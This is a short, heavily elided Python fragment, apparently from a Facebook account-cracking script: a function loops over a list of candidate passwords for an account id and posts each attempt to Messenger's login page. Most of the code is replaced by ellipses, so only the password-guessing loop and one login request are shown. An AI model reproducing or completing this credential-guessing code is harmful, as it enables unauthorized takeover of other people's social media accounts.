...
def m5(idf,pwv):
 ...
 try:
  for ps in pwv:
   ...
   lo = session.post('https://www.messenger.com/login.php?next=https%3A%2F%2Ffamilycenter.facebook.com%2Fdashboard%2F%3Fentrypoint%3Dfcsite',data=log_data,headers=header_freefb).text
